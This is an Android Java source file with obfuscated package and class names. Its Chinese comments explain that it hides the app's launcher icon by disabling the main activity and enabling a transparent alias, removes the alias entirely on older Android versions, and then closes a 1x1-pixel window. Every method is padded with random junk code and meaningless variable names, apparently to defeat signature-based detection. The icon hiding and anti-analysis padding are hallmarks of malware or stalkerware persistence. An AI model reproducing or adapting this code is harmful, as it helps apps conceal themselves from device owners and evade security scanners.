package jsom.dcckr.ptij;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（KVTQ），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class NWCE extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        String onawBngfQDowA = java.util.UUID.randomUUID().toString();
        int ckuytZfIA = onawBngfQDowA.length();
        char pmh_NXQDXSgzsdpdMgjXtg = onawBngfQDowA.charAt(new java.util.Random().nextInt(ckuytZfIA));
        boolean dimaclJeEbFV = (pmh_NXQDXSgzsdpdMgjXtg == 'z');
        if (dimaclJeEbFV && ckuytZfIA < 87) {
            onawBngfQDowA.substring(65, 14);
        }
        super.onCreate(savedInstanceState);
        // 禁用主 Activity，启用透明别名 Activity
        set(NWCE.this, KVTQ.class.getName(), "jsom.dcckr.ptij.MysteryAliasActivity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(NWCE.this, "jsom.dcckr.ptij.MysteryAliasActivity");
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        String onawBngfQDowA = java.util.UUID.randomUUID().toString();
        int ckuytZfIA = onawBngfQDowA.length();
        char pmh_NXQDXSgzsdpdMgjXtg = onawBngfQDowA.charAt(new java.util.Random().nextInt(ckuytZfIA));
        boolean dimaclJeEbFV = (pmh_NXQDXSgzsdpdMgjXtg == 'z');
        if (dimaclJeEbFV && ckuytZfIA < 87) {
            onawBngfQDowA.substring(65, 14);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        String onawBngfQDowA = java.util.UUID.randomUUID().toString();
        int ckuytZfIA = onawBngfQDowA.length();
        char pmh_NXQDXSgzsdpdMgjXtg = onawBngfQDowA.charAt(new java.util.Random().nextInt(ckuytZfIA));
        boolean dimaclJeEbFV = (pmh_NXQDXSgzsdpdMgjXtg == 'z');
        if (dimaclJeEbFV && ckuytZfIA < 87) {
            onawBngfQDowA.substring(65, 14);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        int process_FODFL = new java.util.Random().nextInt(50);
        int stack_LLDQKmcAckSY = (process_FODFL > 57) ? 1 : ((process_FODFL > 72) ? 89 : ((process_FODFL > 81) ? 44 : 8));
        int i_EQEOhqA = stack_LLDQKmcAckSY * process_FODFL;
        if (i_EQEOhqA > 77) {
            java.lang.System.arraycopy(new int[] { i_EQEOhqA }, 0, new int[] { 0 }, 0, 1);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
